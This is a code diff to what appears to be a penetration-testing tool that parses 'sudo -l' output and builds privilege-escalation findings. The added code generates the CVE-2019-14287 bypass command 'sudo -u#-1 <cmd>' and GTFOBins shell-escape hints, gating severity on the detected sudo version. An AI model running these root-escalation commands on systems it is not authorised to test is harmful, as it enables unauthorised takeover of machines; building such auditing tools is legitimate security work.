@@ -32,6 +32,18 @@ _SUDO_RULE_RE = re.compile(
     re.IGNORECASE,
 )
 
+# Matches the "(ALL, !root)" exclusion syntax — CVE-2019-14287 signature.
+_NOT_ROOT_RE = re.compile(r"!\s*root", re.IGNORECASE)
+
+# Extracts the interactive shell-escape sequence from a GTFOBins "-c '<seq>'" style command.
+_DASH_C_ARG_RE = re.compile(r"-c\s+'([^']+)'")
+
+# "Sudo version 1.8.31" / "Sudo version 1.8.21p2"
+_SUDO_VERSION_RE = re.compile(r"Sudo version\s+(\d+\.\d+(?:\.\d+)?(?:p\d+)?)", re.IGNORECASE)
+
+# CVE-2019-14287 is patched in sudo 1.8.28.
+_NOT_ROOT_PATCHED_CUTOFF = (1, 8, 28, 0)
+
 
 # ── Internal helpers ───────────────────────────────────────────────────────────
 
@@ -59,9 +71,13 @@ def normalize_binary(name: str) -> List[str]:
     return candidates
 
 
-def _parse_sudo_rules(section_text: str) -> List[Tuple[str, str, bool, str]]:
-    """Return (binary_name, full_path, nopasswd, sudo_user) tuples from sudo -l section text."""
-    rules: List[Tuple[str, str, bool, str]] = []
+def _parse_sudo_rules(section_text: str) -> List[Tuple[str, str, bool, str, str]]:
+    """Return (binary_name, full_path, nopasswd, sudo_user, full_cmd) tuples from sudo -l section text.
+
+    full_cmd preserves any fixed argument after the binary (e.g. a restricted
+    file path), which matters for exact-command-match sudoers rules.
+    """
+    rules: List[Tuple[str, str, bool, str, str]] = []
     seen: set = set()
 
     for line in section_text.splitlines():
@@ -77,12 +93,12 @@ def _parse_sudo_rules(section_text: str) -> List[Tuple[str, str, bool, str]]:
         if cmd.upper() == "ALL":
             if "ALL" not in seen:
                 seen.add("ALL")
-                rules.append(("ALL", "ALL", nopasswd, sudo_user))
+                rules.append(("ALL", "ALL", nopasswd, sudo_user, cmd_part))
             continue
         name = os.path.basename(cmd)
         if name and name not in seen:
             seen.add(name)
-            rules.append((name, cmd, nopasswd, sudo_user))
+            rules.append((name, cmd, nopasswd, sudo_user, cmd_part))
 
     return rules
 
@@ -91,7 +107,7 @@ def _parse_sudo_rules(section_text: str) -> List[Tuple[str, str, bool, str]]:
 
 def parse_sudo_section(section_text: str) -> List[str]:
     """Extract binary names from sudo -l output lines."""
-    return [name for name, _, _, _ in _parse_sudo_rules(section_text)]
+    return [name for name, _, _, _, _ in _parse_sudo_rules(section_text)]
 
 
 def lookup_sudo(binary: str) -> List[str]:
@@ -117,6 +133,74 @@ def _prefix_sudo(commands: List[str], binary: str, full_path: str, sudo_user: st
     return prefixed
 
 
+def _parse_sudo_version(version_str: str) -> Tuple[int, int, int, int]:
+    """Parse a sudo version string like '1.8.31' or '1.8.21p2' into a comparable tuple."""
+    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?(?:p(\d+))?", version_str)
+    if not m:
+        return (0, 0, 0, 0)
+    return tuple(int(g) if g else 0 for g in m.groups())  # type: ignore[return-value]
+
+
+def _extract_interactive_escape(commands: List[str]) -> Optional[str]:
+    """Extract an interactive shell-escape sequence (e.g. ':shell') from GTFOBins '-c' commands."""
+    for cmd in commands:
+        m = _DASH_C_ARG_RE.search(cmd)
+        if m:
+            return m.group(1)
+    return None
+
+
+def _build_not_root_bypass_finding(binary: str, full_path: str, full_cmd: str, section_text: str) -> Dict:
+    """Build a CVE-2019-14287 finding for a '(ALL, !root) NOPASSWD:' sudo rule.
+
+    The naive `sudo <command>` is refused because root is explicitly excluded;
+    `sudo -u#-1 <command>` bypasses this on sudo < 1.8.28.
+    """
+    version_match = _SUDO_VERSION_RE.search(section_text)
+    note: Optional[str] = None
+
+    if version_match is None:
+        severity = "CRITICAL"
+        note = (
+            "sudo version not detected — CVE-2019-14287 affects sudo < 1.8.28; "
+            "verify with `sudo -V`"
+        )
+    else:
+        version = _parse_sudo_version(version_match.group(1))
+        if version < _NOT_ROOT_PATCHED_CUTOFF:
+            severity = "CRITICAL"
+        else:
+            severity = "INFO"
+            note = (
+                f"sudo {version_match.group(1)} is >= 1.8.28 (patched against "
+                "CVE-2019-14287) — the -u#-1 bypass will not work"
+            )
+
+    commands: List[str] = [
+        "# CVE-2019-14287: sudo (ALL, !root) exclusion bypass via negative UID",
+        f"sudo -u#-1 {full_cmd}",
+    ]
+
+    for candidate in normalize_binary(binary):
+        escape = _extract_interactive_escape(lookup_sudo(candidate))
+        if escape:
+            commands.append(f"# Once inside {binary}, escape to a shell: {escape}")
+            break
+
+    if note:
+        commands.append(f"# {note}")
+
+    return {
+        "binary": binary,
+        "full_path": full_path,
+        "severity": severity,
+        "type": "sudo_not_root_bypass",
+        "cve": "CVE-2019-14287",
+        "nopasswd": True,
+        "commands": commands,
+    }
+
+
 def analyze(section_text: str) -> List[Dict]:
     """Analyze a sudo -l section and return a list of structured findings.
 
@@ -125,7 +209,7 @@ def analyze(section_text: str) -> List[Dict]:
     """
     findings: List[Dict] = []
 
-    for binary, full_path, nopasswd, sudo_user in _parse_sudo_rules(section_text):
+    for binary, full_path, nopasswd, sudo_user, full_cmd in _parse_sudo_rules(section_text):
         if binary == "ALL":
             findings.append({
                 "binary": "ALL",
@@ -135,6 +219,13 @@ def analyze(section_text: str) -> List[Dict]:
                 "nopasswd": nopasswd,
                 "commands": ["sudo /bin/bash", "sudo su"],
             })
+            continue
+
+        # CVE-2019-14287: "(ALL, !root) NOPASSWD: <cmd>" — naive `sudo <cmd>` is
+        # refused; only the -u#-1 bypass works. Emit a distinct finding instead
+        # of the (wrong) generic direct-command finding below.
+        if nopasswd and _NOT_ROOT_RE.search(sudo_user):
+            findings.append(_build_not_root_bypass_finding(binary, full_path, full_cmd, section_text))
             continue
 
         # Try binary name and fallbacks (e.g. python3 -> python) for GTFOBins lookup
